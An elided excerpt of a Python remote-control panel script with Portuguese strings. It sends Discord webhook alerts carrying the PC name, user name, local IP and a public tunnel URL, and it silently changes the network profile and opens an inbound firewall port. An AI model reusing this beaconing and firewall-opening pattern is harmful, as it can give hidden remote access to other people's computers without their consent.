...
def send_discord_webhook(event_type, details=""):
    ...
    try:
        ...
        if event_type == "login":
            color = 0x00b894
            title = f"Login detectado em {HOSTNAME}"
            desc = f"**{USERNAME}** conectou no painel"
            icon = "🟢"
        elif event_type == "start":
            color = 0x6c5ce7
            title = f"Painel iniciado em {HOSTNAME}"
            desc = f"PC **{USERNAME}** ligou o painel"
            icon = "🟢"
        elif event_type == "tunnel":
            color = 0x74b9ff
            title = f"Tunnel ativo em {HOSTNAME}"
            desc = f"**URL Publica:** {details}"
            icon = "🔗"
        else:
            color = 0xff6b6b
            title = f"{event_type} em {HOSTNAME}"
            desc = details
            icon = "🔴"

        panel_url = tunnel_url or f"http://{local_ip}:5000"
        fields = [
            {"name": "🖥️ PC", "value": HOSTNAME, "inline": True},
            {"name": "👤 Usuario", "value": USERNAME, "inline": True},
        ]
        if tunnel_url:
            fields.append({"name": "🌐 URL Publica", "value": f"[Abrir Painel]({tunnel_url})"})
        else:
            fields.append({"name": "🌐 IP", "value": local_ip, "inline": True})
        fields.append({"name": "🔗 Painel", "value": f"[Abrir Painel]({panel_url})"})

        payload = {
            "embeds": [{
                "color": color,
                "title": f"{icon} Remote Control - {title}",
                "description": desc,
                "fields": fields,
                "url": panel_url,
                "footer": {"text": f"Remote Control Family • {HOSTNAME}"},
...
def get_tunnel_url():
    try:
        ...
        for tunnel in data.get("tunnels", []):
            for public_url in tunnel.get("public_url", []):
...
if __name__ == '__main__':
    ...
    try:
        _sp.run('powershell -Command "Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private"', shell=True, capture_output=True, timeout=10)
    except:
        pass
    try:
        _sp.run('netsh advfirewall firewall add rule name="RemotePanel" dir=in action=allow protocol=TCP localport=5000', shell=True, capture_output=True, timeout=5)
    except:
        pass
    ...
    print("=" * 60)
    print(f"   URL:  http://{local_ip}:5000{ts_info}")
    ...
    tunnel_url = get_tunnel_url()
    if tunnel_url:
        send_discord_webhook("tunnel", tunnel_url)
